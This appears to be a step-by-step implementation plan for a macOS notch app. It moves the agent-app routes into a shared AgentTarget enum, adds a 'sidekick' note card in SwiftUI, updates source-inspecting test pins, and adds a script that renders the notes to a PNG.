        CT.checkTrue("the five files are there", hooks.contains("final class HookServer") && rules.contains("enum HookOrigin") && types.contains("struct ApprovalInfo") && app.contains("final class AppState") && view.contains("private func openAgentTarget"))
```

**Edit `tests/HookOriginWiringTests.swift`** (the find text occurs exactly once)

Find:

```swift
        CT.checkTrue("AppState holds the session's host and the pill's current session, unpublished", app.contains("var sessionHosts: [String: HookOrigin.TapHost] = [:]") && app.contains("var pillSessions: [String: String] = [:]") && !app.contains("@Published var sessionHosts") && !app.contains("@Published var pillSessions"))
        CT.checkTrue("noteHost takes the session, and forgetSession exists for SessionEnd", app.contains("func noteHost(_ pillId: String, session sessionId: String, _ bundleId: String?)") && app.contains("func forgetSession(_ sessionId: String)"))
        CT.checkTrue("the pill's tap asks the pure rule, in the GitHub build only, and VS Code's route follows unchanged", view.contains("case \"integration_claude\":\n            #if !APPSTORE\n") && view.contains("let host = HookOrigin.tapHost(cardSession: cardSession, currentSession: appState.pillSessions[task.id], sessionHosts: appState.sessionHosts, pillHost: appState.hostBundleIds[task.id])") && at("HookOrigin.tapHost(", in: view) < at("let vscodeBundleId = \"com.microsoft.VSCode\"", in: view))
        CT.checkTrue("the tap takes the card's session only from a card on this pill, and reads the pill-keyed map only as the rule's fallback", view.contains("appState.pendingApproval.flatMap { $0.pillId == task.id ? $0.sessionId : nil }") && count("hostBundleIds[", in: view) == 1 && !view.contains("if let id = AppState.shared.hostBundleIds[task.id]"))
        let sessionEnd = at("case \"SessionEnd\":", in: hooks)
        CT.checkTrue("SessionEnd forgets that session's host once, before the pill goes", sessionEnd > 0 && count("state.forgetSession(", in: hooks) == 1 && at("state.forgetSession(sessionId)", in: hooks, from: sessionEnd) > sessionEnd && at("state.forgetSession(sessionId)", in: hooks, from: sessionEnd) < at("state.removeTask(id: agentId)", in: hooks, from: sessionEnd))
```

Replace with:

```swift
        CT.checkTrue("AppState holds the session's host and the pill's current session, unpublished", app.contains("var sessionHosts: [String: HookOrigin.TapHost] = [:]") && app.contains("var pillSessions: [String: String] = [:]") && !app.contains("@Published var sessionHosts") && !app.contains("@Published var pillSessions"))
        CT.checkTrue("noteHost takes the session, and forgetSession exists for SessionEnd", app.contains("func noteHost(_ pillId: String, session sessionId: String, _ bundleId: String?)") && app.contains("func forgetSession(_ sessionId: String)"))
        CT.checkTrue("the pill's tap asks the pure rule, in the GitHub build only, and VS Code's route follows unchanged (the routes live in AgentTarget, which the ↗ button, a drop on an agent's cat and a sidekick note share)", target.contains("case \"integration_claude\":\n            #if !APPSTORE\n") && target.contains("let host = HookOrigin.tapHost(cardSession: cardSession, currentSession: appState.pillSessions[pillId], sessionHosts: appState.sessionHosts, pillHost: appState.hostBundleIds[pillId])") && at("HookOrigin.tapHost(", in: target) < at("let vscodeBundleId = \"com.microsoft.VSCode\"", in: target) && view.contains("AgentTarget.bringForward(pillId: task.id)"))
        CT.checkTrue("the tap takes the card's session only from a card on this pill, and reads the pill-keyed map only as the rule's fallback", target.contains("appState.pendingApproval.flatMap { $0.pillId == pillId ? $0.sessionId : nil }") && count("hostBundleIds[", in: target) == 1 && !target.contains("if let id = AppState.shared.hostBundleIds[pillId]") && count("hostBundleIds[", in: view) == 0)
        let sessionEnd = at("case \"SessionEnd\":", in: hooks)
        CT.checkTrue("SessionEnd forgets that session's host once, before the pill goes", sessionEnd > 0 && count("state.forgetSession(", in: hooks) == 1 && at("state.forgetSession(sessionId)", in: hooks, from: sessionEnd) > sessionEnd && at("state.forgetSession(sessionId)", in: hooks, from: sessionEnd) < at("state.removeTask(id: agentId)", in: hooks, from: sessionEnd))
```

- [ ] **Step 2: Run the pins to make them fail**

Run: `bash scripts/test-sidekick-wiring.sh 2>&1 | grep -E "✗|passed|failed"; bash scripts/test-hook-origin-wiring.sh 2>&1 | grep -E "✗|passed|failed"`
Expected: FAIL: the new pins of the sidekick's wiring test (`✗ the island has a view of its own…`, the hosting, the buttons, the routes) and, in the all-terminals test, the two pins that now read `AgentTarget.swift`, each program ending `N test(s) failed.`.

- [ ] **Step 3: Move the routes into `AgentTarget`, and give the island its row**

**Create `NotchBuddy/Sources/App/AgentTarget.swift`**

```swift
import AppKit

// Bringing an agent's app forward: the routes the pill's ↗ button has always used (`OverviewView.openAgentTarget`), moved here so a drop on an agent's cat and a sidekick note's "Show me"
// use the SAME routes and cannot drift from them. Claude Code: the app of the session the user is looking at (a terminal, `HookOrigin.tapHost`), else VS Code. Cursor and Codex: their own apps.
// Gemini and Antigravity: the first running terminal. All but Claude Code's VS Code route are the GitHub build's (`#if !APPSTORE`), as before. It brings an app to the front; it does not pick a tab,
// type, paste or send anything.

enum AgentTarget {
    @MainActor
    static func bringForward(pillId: String) {
        switch pillId {
        case "integration_claude":
            #if !APPSTORE
            // The app of the session the user is looking at (HookOrigin.tapHost): the open card's session on this pill, else the pill's current one. VS Code's route, below, is as it was.
            let appState = AppState.shared
            let cardSession = appState.pendingApproval.flatMap { $0.pillId == pillId ? $0.sessionId : nil }
            let host = HookOrigin.tapHost(cardSession: cardSession, currentSession: appState.pillSessions[pillId], sessionHosts: appState.sessionHosts, pillHost: appState.hostBundleIds[pillId])
            if case .app(let id) = host, let app = NSWorkspace.shared.runningApplications.first(where: { $0.bundleIdentifier == id }) {
                app.activate(options: .activateIgnoringOtherApps)
                return
            }
            #endif
            let vscodeBundleId = "com.microsoft.VSCode"
            if let app = NSWorkspace.shared.runningApplications.first(where: { $0.bundleIdentifier == vscodeBundleId }) {
                app.activate(options: .activateIgnoringOtherApps)
            } else {
                NSWorkspace.shared.open(URL(fileURLWithPath: "/Applications/Visual Studio Code.app"))
            }
        case "agent_cursor":
            #if !APPSTORE
            if let url = NSWorkspace.shared.urlForApplication(
                withBundleIdentifier: "com.todesktop.230313mzl4w4u92") {
                NSWorkspace.shared.openApplication(at: url, configuration: .init(), completionHandler: nil)
            }
            #endif
        case "agent_codex":
            #if !APPSTORE
            if let url = NSWorkspace.shared.urlForApplication(
                withBundleIdentifier: "com.openai.codex") {
                NSWorkspace.shared.openApplication(at: url, configuration: .init(), completionHandler: nil)
            }
            #endif
        case "agent_gemini", "agent_antigravity":
            #if !APPSTORE
            let terminalBundleIds = ["com.apple.Terminal", "com.googlecode.iterm2",
                                     "net.kovidgoyal.kitty", "com.mitchellh.ghostty"]
            if let hit = terminalBundleIds.compactMap({ id in
                NSWorkspace.shared.runningApplications.first { $0.bundleIdentifier == id }
            }).first {
                hit.activate(options: .activateIgnoringOtherApps)
            }
            #endif
        default:
            break
        }
    }
}
```

**Edit `NotchBuddy/Sources/App/IslandViewContent.swift`** (the find text occurs exactly once)

Find:

```swift
        case .greeting:  EmptyView()  // GreetingCanvasView overlaid in IslandRootView
        case .shelf:
```

Replace with:

```swift
        case .greeting:  EmptyView()  // GreetingCanvasView overlaid in IslandRootView
        case .sidekick:  SidekickView(engine: Sidekick.shared.engine, state: state)
        case .shelf:
```

**Edit `NotchBuddy/Sources/App/IslandViewContent.swift`** (the find text occurs exactly once)

Find:

```swift
        guard let task else { return }
        switch task.id {
        case "integration_claude":
            #if !APPSTORE
            // The app of the session the user is looking at (HookOrigin.tapHost): the open card's session on this pill, else the pill's current one. VS Code's route, below, is as it was.
            let appState = AppState.shared
            let cardSession = appState.pendingApproval.flatMap { $0.pillId == task.id ? $0.sessionId : nil }
            let host = HookOrigin.tapHost(cardSession: cardSession, currentSession: appState.pillSessions[task.id], sessionHosts: appState.sessionHosts, pillHost: appState.hostBundleIds[task.id])
            if case .app(let id) = host, let app = NSWorkspace.shared.runningApplications.first(where: { $0.bundleIdentifier == id }) {
                app.activate(options: .activateIgnoringOtherApps)
                return
            }
            #endif
            let vscodeBundleId = "com.microsoft.VSCode"
            if let app = NSWorkspace.shared.runningApplications.first(where: { $0.bundleIdentifier == vscodeBundleId }) {
                app.activate(options: .activateIgnoringOtherApps)
            } else {
                NSWorkspace.shared.open(URL(fileURLWithPath: "/Applications/Visual Studio Code.app"))
            }
        case "integration_resend":
            NSWorkspace.shared.open(URL(string: "https://resend.com/emails")!)
```

Replace with:

```swift
        guard let task else { return }
        switch task.id {
        case "integration_claude", "agent_cursor", "agent_codex", "agent_gemini", "agent_antigravity":
            AgentTarget.bringForward(pillId: task.id)   // the same routes as a drop on an agent's cat and a note's Show me use (AgentTarget.swift)
        case "integration_resend":
            NSWorkspace.shared.open(URL(string: "https://resend.com/emails")!)
```

**Edit `NotchBuddy/Sources/App/IslandViewContent.swift`** (the find text occurs exactly once)

Find:

```swift
        case "integration_calcom":
            NSWorkspace.shared.open(URL(string: "https://app.cal.com/bookings")!)
        case "agent_cursor":
            #if !APPSTORE
            if let url = NSWorkspace.shared.urlForApplication(
                withBundleIdentifier: "com.todesktop.230313mzl4w4u92") {
                NSWorkspace.shared.openApplication(at: url, configuration: .init(), completionHandler: nil)
            }
            #endif
        case "agent_codex":
            #if !APPSTORE
            if let url = NSWorkspace.shared.urlForApplication(
                withBundleIdentifier: "com.openai.codex") {
                NSWorkspace.shared.openApplication(at: url, configuration: .init(), completionHandler: nil)
            }
            #endif
        case "agent_gemini", "agent_antigravity":
            #if !APPSTORE
            let terminalBundleIds = ["com.apple.Terminal", "com.googlecode.iterm2",
                                     "net.kovidgoyal.kitty", "com.mitchellh.ghostty"]
            if let hit = terminalBundleIds.compactMap({ id in
                NSWorkspace.shared.runningApplications.first { $0.bundleIdentifier == id }
            }).first {
                hit.activate(options: .activateIgnoringOtherApps)
            }
            #endif
        case "ai_anthropic":
            switchChatProvider(.anthropic)
```

Replace with:

```swift
        case "integration_calcom":
            NSWorkspace.shared.open(URL(string: "https://app.cal.com/bookings")!)
        case "ai_anthropic":
            switchChatProvider(.anthropic)
```

**Edit `NotchBuddy/Sources/App/IslandTypes.swift`** (the find text occurs exactly once)

Find:

```swift
    case searching, result, note, settings, greeting
    case shelf   // sub-project G1: the files parked in the notch
}
```

Replace with:

```swift
    case searching, result, note, settings, greeting
    case shelf   // sub-project G1: the files parked in the notch
    /// A note from the sidekick (a recap, a nudge): `SidekickView`. It opens the way a finished task does and goes by itself.
    case sidekick
}
```

**Edit `NotchBuddy/Sources/App/IslandTypes.swift`** (the find text occurs exactly once)

Find:

```swift
        .result:    ViewLayout(height: 160, botX: 52,  botY: nil, botDiameter: 44, agentMode: .column),
        .note:      ViewLayout(height: 160, botX: 60,  botY: nil, botDiameter: 50, agentMode: .column),
        .settings:  ViewLayout(height: 160, botX: 54,  botY: nil, botDiameter: 46, agentMode: .none),
```

Replace with:

```swift
        .result:    ViewLayout(height: 160, botX: 52,  botY: nil, botDiameter: 44, agentMode: .column),
        .note:      ViewLayout(height: 160, botX: 60,  botY: nil, botDiameter: 50, agentMode: .column),
        .sidekick:  ViewLayout(height: 160, botX: 62,  botY: nil, botDiameter: 56, agentMode: .column),
        .settings:  ViewLayout(height: 160, botX: 54,  botY: nil, botDiameter: 46, agentMode: .none),
```

- [ ] **Step 4: Draw the note**

**Create `NotchBuddy/Sources/App/SidekickView.swift`**

```swift
import SwiftUI

// The island's `.sidekick` view: one note from the sidekick, in the style of the island's other cards (the same card, the cat at the left, a title, the words, the same buttons). It is a row of its own
// (`IslandConst.viewLayouts[.sidekick]`), not the `.note` view, which is the AI error flow. It opens the way a finished task does (`.hookExpand`) and goes by itself (the engine's clock), so it
// never covers a card, the chat or the user's other work, and never opens a window. OK and × are the same thing and count as a dismissal; Not now counts too; Show me brings the agent's app forward
// and does not. It shows words and buttons and nothing else: a note never answers a request.

struct SidekickView: View {
    @ObservedObject var engine: SidekickEngine
    @ObservedObject var state: AppState

    /// The first line of the card.
    static func title(_ kind: String) -> String {
        switch kind {
        case "recap": return "Welcome back"
        case "stuck.loop": return "Going in circles"
        case "stuck.errors": return "Running into errors"
        case "stuck.waiting": return "Waiting for you"
        case "stuck.silent": return "Gone quiet"
        default: return ""
        }
    }

    /// The island is open on this note: the user has seen it.
    private var seen: Bool { state.mode == .expanded && state.view == .sidekick && engine.showing != nil }

    var body: some View {
        ZStack {
            CardBackground(wash: nil)
            if let note = engine.showing {
                // One sentence gets a title and two lines. A recap of several agents has no title and one line for each agent (the card is 98 pt high: it never grows).
                let rows = note.rows
                VStack(alignment: .leading, spacing: 6) {
                    if rows.count == 1 { Text(Self.title(note.kind)).font(.system(size: 12, weight: .semibold)).foregroundColor(Color(hex: "#F5F6F8")) }
                    VStack(alignment: .leading, spacing: 2) {
                        ForEach(Array(rows.enumerated()), id: \.offset) { _, row in
                            Text(row)
                                .font(.system(size: 12)).foregroundColor(Color(hex: "#C8CDD4"))
                                .lineLimit(rows.count == 1 ? 2 : 1).fixedSize(horizontal: false, vertical: true)
                        }
                    }
                    HStack(spacing: 8) {
                        if note.isRecap {
                            PrimaryButton("OK") { engine.dismiss() }
                        } else {
                            SecondaryButton("Not now") { engine.dismiss() }
                            PrimaryButton("Show me") {
                                if let shown = engine.act(), let agent = shown.agentId { AgentTarget.bringForward(pillId: agent) }
                            }
                        }
                    }
                }
                .padding(.leading, 116)
                .padding(.trailing, 34)
                .padding(.vertical, 4)
                .frame(maxWidth: .infinity, alignment: .leading)

                // × is the same as OK.
                Button { engine.dismiss() } label: {
                    Image(systemName: "xmark")
                        .font(.system(size: 8, weight: .medium))
                        .foregroundColor(Color(hex: "#5F646D"))
                        .frame(width: 16, height: 16)
                        .background(Color.white.opacity(0.07))
                        .clipShape(Circle())
                }
                .buttonStyle(.plain)
                .accessibilityLabel("Dismiss")
                .padding(.top, 8).padding(.trailing, 10)
                .frame(maxWidth: .infinity, maxHeight: .infinity, alignment: .topTrailing)
            }
        }
        .accessibilityIdentifier(Sidekick.marker)   // in every build's binary: the binary check looks for it
        .onChange(of: seen) { _, nowSeen in if nowSeen { engine.noteSeen() } }
    }
}
```

- [ ] **Step 5: Present, hide and host it**

**Edit `NotchBuddy/Sources/App/Sidekick.swift`** (the find text occurs exactly once)

Find:

```swift
    static let realHome: String = getpwuid(getuid()).flatMap { String(validatingCString: $0.pointee.pw_dir) } ?? NSHomeDirectory()

    let engine: SidekickEngine
    private var cancellables = Set<AnyCancellable>()
```

Replace with:

```swift
    static let realHome: String = getpwuid(getuid()).flatMap { String(validatingCString: $0.pointee.pw_dir) } ?? NSHomeDirectory()

    /// What only the island's window knows (is the user typing, is the pointer on it), set once at launch by `AppDelegate`.
    final class Inputs {
        var typing: () -> Bool = { false }
        var pointerOver: () -> Bool = { false }
        /// Where the island was when a note opened it, to put it back afterwards.
        var mode: IslandMode = .compact
        var collapsePending = false
    }
    let inputs = Inputs()
    let engine: SidekickEngine
    private var cancellables = Set<AnyCancellable>()
```

**Edit `NotchBuddy/Sources/App/Sidekick.swift`** (the find text occurs exactly once)

Find:

```swift
        env.ratelimited = { AppState.shared.tasks.contains { $0.state == .ratelimit } }
        env.idleSeconds = { PresenceMonitor.idleSeconds() }
        engine = SidekickEngine(store: .shared, clock: clock, env: env, codex: Self.codexEnabled)
        // A lock, a sleep or a dark display, from the monitor the desktop cat shares: no observers of its own.
        PresenceMonitor.shared.subscribe("sidekick") { [weak self] event in self?.engine.presenceEvent(event) }
        PresenceMonitor.shared.start()
        // A change of a setting (the switch, Unmute) decides again what may show.
        SidekickStore.shared.$settings.dropFirst().sink { [weak self] _ in MainActor.assumeIsolated { self?.engine.envChanged() } }.store(in: &cancellables)
```

Replace with:

```swift
        env.ratelimited = { AppState.shared.tasks.contains { $0.state == .ratelimit } }
        env.idleSeconds = { PresenceMonitor.idleSeconds() }
        let inputs = self.inputs
        env.canHost = { let app = AppState.shared; return SidekickHost.canHost(expanded: app.mode == .expanded, view: app.view.rawValue) }
        env.typing = { inputs.typing() }
        env.pointerOver = { inputs.pointerOver() }
        // A note opens the island on its own row the way a finished task does (`.hookExpand`): no window of its own, and never over a card, the chat or Settings (`canHost`).
        env.present = { _ in
            inputs.mode = AppState.shared.mode
            inputs.collapsePending = false
            NotificationCenter.default.post(name: .hookExpand, object: IslandView.sidekick)
        }
        // The island goes back to where it was: the overview, and folded if the note had opened it. The fold waits one turn, so a note that replaces this one does not make the island blink.
        env.retract = { _ in
            let app = AppState.shared
            guard app.view == .sidekick else { return }
            app.view = app.tasks.isEmpty ? .empty : .overview
            guard inputs.mode != .expanded else { return }
            inputs.collapsePending = true
            DispatchQueue.main.async {
                guard inputs.collapsePending, Sidekick.shared.engine.showing == nil else { return }
                inputs.collapsePending = false
                NotificationCenter.default.post(name: .islandCollapse, object: nil)
            }
        }
        engine = SidekickEngine(store: .shared, clock: clock, env: env, codex: Self.codexEnabled)
        // A lock, a sleep or a dark display, from the monitor the desktop cat shares: no observers of its own.
        PresenceMonitor.shared.subscribe("sidekick") { [weak self] event in self?.engine.presenceEvent(event) }
        PresenceMonitor.shared.start()
        // The waiting nudge is for a request whose card is NOT on screen: when the card shows or hides, its deadline changes.
        let app = AppState.shared
        app.$view.combineLatest(app.$mode).map { $0 == .approval && $1 == .expanded }.removeDuplicates().dropFirst()
            .sink { [weak self] _ in MainActor.assumeIsolated { self?.engine.envChanged() } }.store(in: &cancellables)
        // A change of a setting (the switch, Unmute) decides again what may show.
        SidekickStore.shared.$settings.dropFirst().sink { [weak self] _ in MainActor.assumeIsolated { self?.engine.envChanged() } }.store(in: &cancellables)
```

**Edit `NotchBuddy/Sources/App/IslandWindowController.swift`** (the find text occurs exactly once)

Find:

```swift
        expand(to: view)
    }

    // MARK: - Pill helpers
```

Replace with:

```swift
        expand(to: view)
    }

    /// The user is typing in the island: it is the key window with a text field being edited. The sidekick's notes wait for them to finish.
    var isTyping: Bool { islandPanel.isKeyWindow && islandPanel.firstResponder is NSTextView }
    /// The pointer is on the island (the poll's own answer). A note stays up while it is.
    var pointerInside: Bool { wasInIsland }

    // MARK: - Pill helpers
```

**Edit `NotchBuddy/Sources/App/AppDelegate.swift`** (the find text occurs exactly once)

Find:

```swift
        islandController?.fsm.launch()
        if let island = islandController {
            let cat = DesktopCatController(island: island)
            island.desktop = cat
```

Replace with:

```swift
        islandController?.fsm.launch()
        if let island = islandController {
            // The sidekick's notes wait while the user types in the island and stay while the pointer is on it.
            Sidekick.shared.inputs.typing = { [weak island] in island?.isTyping ?? false }
            Sidekick.shared.inputs.pointerOver = { [weak island] in island?.pointerInside ?? false }
            let cat = DesktopCatController(island: island)
            island.desktop = cat
```

- [ ] **Step 6: Run the pins, the neighbours' tests and the build**

Run: `for s in test-sidekick-wiring test-sidekick-notes test-sidekick-engine test-hook-origin-wiring test-cat-wiring test-island-wing-wiring test-cat-desktop-wiring; do printf '%-34s' $s; bash scripts/$s.sh 2>&1 | tail -1; done`
Expected: seven lines, each `All tests passed.`

```bash
cd NotchBuddy && xcodegen > /dev/null && cd .. && xcodebuild -project NotchBuddy/NotchBuddy.xcodeproj -scheme NotchBuddy -configuration Debug -derivedDataPath NotchBuddy/build build CODE_SIGNING_ALLOWED=NO 2>&1 | tail -3
```

Expected: `** BUILD SUCCEEDED **` (no exhaustive `switch` over `IslandView` breaks: the dry run built the first time).

- [ ] **Step 7: Draw the notes and look at them**

`scripts/render-sidekick.swift` makes each note with the **real engine** (a clock by hand, the hook events of a made-up session, nothing stored: its settings are a dictionary) and draws `SidekickView` in a mock of the open island, with the big cat where the island puts it.

**Create `scripts/render-sidekick.swift`**

```swift
import AppKit
import SwiftUI

// Draws the sidekick's notes (SidekickView, in SidekickView.swift) into a PNG without launching NotchMeow: each note is made by the real engine, driven by a clock by hand and the hook events of a
// made-up session, and its own SwiftUI view goes into a window that is never shown, in a mock of the open island (a black shape of the expanded size with the card where IslandContentView puts it, 10 pt
// in, 42 pt down, 98 pt high, and the big cat beside it, drawn by the real renderer where the island puts it). The three notes the owner sees: the recap after a lock, the nudge for a loop, and the
// nudge for a request nobody is looking at.
//   bash scripts/render-sidekick.sh --out sidekick-notes.png [--scale 2]
// Run it through the .sh: it compiles the whole app but NotchBuddyApp.swift, and runs in a home folder of its own.

@main
struct RenderSidekick {
    final class Clock { var t = 0.0 }
    /// A settings store on a dictionary: the tool never writes the user's preferences.
    final class DictBacking: CatSettingsBacking {
        var values: [String: Any] = [:]
        func object(forKey key: String) -> Any? { values[key] }
        func set(_ value: Any?, forKey key: String) { values[key] = value }
        func removeObject(forKey key: String) { values[key] = nil }
        func allKeys() -> [String] { Array(values.keys) }
    }

    @MainActor static func bigCat(_ cg: CGContext, coat: String, state: CatState, colour: String, cx: Double, cy: Double, d: Double) {
        let clock = Clock(), rng = CatRNG(seed: 3), preset = CatPresets.byID(coat)
        let e = CatEngine(preset, mini: false, now: { clock.t }, rand: { rng.next() }, cfg: CatConfig(motion: "playful"), quiet: true, state: state)
        func place() { let L = CatGeometry.layout(preset, e.s, cx: 0, cy: 0, D: d); e.base = L.base; e.mouthPoint = L.mouth }
        place()
        for _ in 0..<72 { clock.t += 1000.0 / 60; e.update(dt: 1.0 / 60); place() }
        e.collar = CatRules.bigCatCollar(colour: colour, state: state)
        CatRenderer.draw(cg, e.look(time: clock.t / 1000), cx: cx, cy: cy, D: d, CatDrawOptions(badge: true))
    }

    static func hook(_ name: String, _ extra: [String: Any] = [:]) -> [String: Any] {
        var p: [String: Any] = ["hook_event_name": name, "session_id": "render", "cwd": "/Users/me/NotchMeow", "term_program": "vscode"]
        for (k, v) in extra { p[k] = v }
        return p
    }
    static func edit(_ file: String) -> [String: Any] { hook("PostToolUse", ["tool_name": "Edit", "tool_input": ["file_path": "/Users/me/NotchMeow/\(file)", "old_string": "a", "new_string": "b"]]) }

    /// A new engine on a clock by hand: no timer is ever set, and nothing is stored.
    @MainActor static func engine(_ now: Ref) -> SidekickEngine {
        let clock = SidekickClock(now: { now.t }, schedule: { _, _ in {} })
        var env = SidekickEngine.Env(now: { now.t })
        env.canHost = { true }
        return SidekickEngine(store: SidekickStore(backing: DictBacking()), clock: clock, env: env)
    }
    final class Ref { var t = 100_000_000.0 }

    /// The three notes, each shown by its own engine.
    @MainActor static func notes() -> [SidekickEngine] {
        let sec = 1000.0, min = 60_000.0
        // 1. The recap: a lock, an agent that edits three files and finishes while the user is away, and the return.
        let r = Ref(), recap = engine(r)
        recap.feed(payload: hook("SessionStart"))
        recap.presenceEvent(.lock)
        for f in ["SidekickEngine.swift", "SidekickView.swift", "docs/SPEC.md"] { r.t += 20 * sec; recap.feed(payload: edit(f)) }
        for c in ["swift build", "npm test"] { r.t += 20 * sec; recap.feed(payload: hook("PostToolUse", ["tool_name": "Bash", "tool_input": ["command": c]])) }
        r.t += 20 * sec; recap.feed(payload: hook("Stop"))
        r.t += 3 * min; recap.presenceEvent(.unlock)
        // 2. The loop: the same step four times.
        let l = Ref(), loop = engine(l)
        loop.feed(payload: hook("SessionStart"))
        for _ in 0..<4 { l.t += 2 * sec; loop.feed(payload: hook("PostToolUse", ["tool_name": "Bash", "tool_input": ["command": "swift test"]])) }
        // 3. A request nobody is looking at, a minute on.
        let w = Ref(), waiting = engine(w)
        waiting.feed(payload: hook("SessionStart"))
        waiting.feed(payload: hook("PermissionRequest", ["tool_name": "Bash", "tool_input": ["command": "git push origin main"]]))
        w.t += 61 * sec; waiting.envChanged()
        // 4. The busiest recap there is: three agents, each with files, and one more.
        let b = Ref(), busy = engine(b)
        let agents: [(tag: String, project: String)] = [("", "NotchMeow"), ("codex", "site"), ("gemini", "docs"), ("antigravity", "api")]
        for a in agents { busy.feed(payload: hook("SessionStart", a.tag.isEmpty ? [:] : ["nm_agent": a.tag, "session_id": a.tag, "cwd": "/Users/me/\(a.project)"])) }
        busy.presenceEvent(.lock)
        for (i, a) in agents.enumerated() {
            for f in ["index.html", "site.css", "main.js", "README.md"] {
                b.t += 5 * sec
                var extra: [String: Any] = ["tool_name": "Edit", "tool_input": ["file_path": "/Users/me/\(a.project)/\(f)", "old_string": "a", "new_string": "b"]]
                if !a.tag.isEmpty { extra["nm_agent"] = a.tag; extra["session_id"] = a.tag; extra["cwd"] = "/Users/me/\(a.project)" }
                busy.feed(payload: hook("PostToolUse", extra))
            }
            _ = i
        }
        b.t += 3 * min; busy.presenceEvent(.unlock)
        return [recap, loop, waiting, busy]
    }

    @MainActor static func render(_ engine: SidekickEngine, scale: Double) -> CGImage? {
        let state = AppState.shared
        let (islandW, islandH) = islandSize(mode: .expanded, view: .sidekick)
        let (botX, botY, botD, _) = botPosition(mode: .expanded, view: .sidekick, islandW: islandW, islandH: islandH, uploadProgress: 0)
        let island = ZStack(alignment: .topLeading) {
            Color.black
            SidekickView(engine: engine, state: state).frame(width: Double(islandW) - 20, height: 98).offset(x: 10, y: 42)
        }
        .frame(width: islandW, height: islandH, alignment: .topLeading)
        .foregroundColor(Color(hex: "#F5F6F8"))
        .clipShape(UnevenRoundedRectangle(bottomLeadingRadius: IslandConst.expandedCorner, bottomTrailingRadius: IslandConst.expandedCorner))
        let host = NSHostingView(rootView: island)
        host.frame = NSRect(x: 0, y: 0, width: islandW, height: islandH)
        let win = NSWindow(contentRect: host.frame, styleMask: [.titled], backing: .buffered, defer: false)
        win.appearance = NSAppearance(named: .darkAqua)
        win.contentView = host
        host.layoutSubtreeIfNeeded()
        RunLoop.current.run(until: Date().addingTimeInterval(0.5))
        host.layoutSubtreeIfNeeded()
        guard let rep = NSBitmapImageRep(bitmapDataPlanes: nil, pixelsWide: Int((Double(islandW) * scale).rounded()), pixelsHigh: Int((Double(islandH) * scale).rounded()), bitsPerSample: 8,
                                         samplesPerPixel: 4, hasAlpha: true, isPlanar: false, colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0) else { return nil }
        rep.size = host.bounds.size
        host.cacheDisplay(in: host.bounds, to: rep)
        guard let shot = rep.cgImage,
              let cg = CGContext(data: nil, width: shot.width, height: shot.height, bitsPerComponent: 8, bytesPerRow: 0, space: CGColorSpace(name: CGColorSpace.sRGB)!, bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else { return nil }
        cg.draw(shot, in: CGRect(x: 0, y: 0, width: shot.width, height: shot.height))
        cg.translateBy(x: 0, y: Double(shot.height))
        cg.scaleBy(x: scale, y: -scale)
        bigCat(cg, coat: "shrimpy", state: .working, colour: "#E07950", cx: Double(botX), cy: Double(botY), d: Double(botD))
        return cg.makeImage()
    }

    @MainActor static func main() {
        var out = "sidekick-notes.png", scale = 2.0
        var it = CommandLine.arguments.dropFirst().makeIterator()
        while let k = it.next() {
            switch k {
            case "--out": out = it.next() ?? out
            case "--scale": scale = Double(it.next() ?? "") ?? scale
            default: FileHandle.standardError.write(Data("unknown argument \(k)\n".utf8)); exit(2)
            }
        }
        _ = NSApplication.shared
        let engines = notes()
        guard engines.allSatisfy({ $0.showing != nil }) else { FileHandle.standardError.write(Data("an engine showed no note\n".utf8)); exit(1) }
        let images = engines.compactMap { render($0, scale: scale) }
        guard images.count == engines.count else { exit(1) }
        // The page's dark with 16 pt around the islands and 12 pt between them.
        let margin = 16.0 * scale, gap = 12.0 * scale
        let W = Double(images[0].width) + 2 * margin, H = images.reduce(margin) { $0 + Double($1.height) + gap }
        guard let cg = CGContext(data: nil, width: Int(W), height: Int(H), bitsPerComponent: 8, bytesPerRow: 0, space: CGColorSpace(name: CGColorSpace.sRGB)!, bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else { exit(1) }
        cg.setFillColor(CGColor(srgbRed: 0.059, green: 0.063, blue: 0.071, alpha: 1))
        cg.fill(CGRect(x: 0, y: 0, width: W, height: H))
        var y = H - margin
        for img in images { y -= Double(img.height); cg.draw(img, in: CGRect(x: margin, y: y, width: Double(img.width), height: Double(img.height))); y -= gap }
        guard let flat = cg.makeImage(), let png = NSBitmapImageRep(cgImage: flat).representation(using: .png, properties: [:]) else { exit(1) }
        try! png.write(to: URL(fileURLWithPath: out))
        print("wrote \(out)")
    }
}
```

**Create `scripts/render-sidekick.sh`**

```bash
#!/usr/bin/env bash
# Draws the sidekick's notes (SidekickView) with the big cat beside them into a PNG, without launching NotchMeow (see scripts/render-sidekick.swift): a recap after a lock, a nudge for a loop and
# a nudge for a request nobody is looking at, each made by the real engine on a clock by hand.
#   bash scripts/render-sidekick.sh --out sidekick-notes.png [--scale 2]
# SidekickView reads the app's AppState, so this script compiles every file of the app except NotchBuddyApp.swift (the app's own @main): about two minutes. AppState is made (it reads UserDefaults,
# which for this tool is a domain of its own, and ~/.claude/settings.json, which is in the empty home folder below: scripts/render-home-guard.sh points Foundation at that folder and kills the tool
# if it ever opens the real ~/.claude, ~/.gemini or ~/.codex) and it saves a few defaults into that domain: the script deletes them when it ends, and never touches NotchMeow's own preferences.
set -euo pipefail
cd "$(dirname "$0")/.."
BUILD_DIR="$(mktemp -d "${TMPDIR:-/tmp}/notchmeow-render-sidekick.XXXXXX")"
REAL_HOME="$HOME"
cleanup() {
    rm -rf "$BUILD_DIR"
    defaults delete render-sidekick > /dev/null 2>&1 || true
    rm -f "$REAL_HOME/Library/Preferences/render-sidekick.plist"
}
trap cleanup EXIT
export NM_LOG_DIR="$BUILD_DIR/logs"
mkdir -p "$BUILD_DIR/home"
APP=NotchBuddy/Sources/App
FILES=()
while IFS= read -r f; do FILES+=("$f"); done < <(find "$APP" -name '*.swift' ! -name NotchBuddyApp.swift | sort)
swiftc -swift-version 6 -suppress-warnings "${FILES[@]}" scripts/render-sidekick.swift -o "$BUILD_DIR/render-sidekick"
. scripts/render-home-guard.sh
render_home_guard "$BUILD_DIR/home" "$BUILD_DIR/render-sidekick" "$@"
```

Then make it executable: `chmod +x scripts/render-sidekick.sh`

```bash
bash scripts/render-sidekick.sh --out "${TMPDIR:-/tmp}/f1-mac-1/sidekick-notes.png"
```

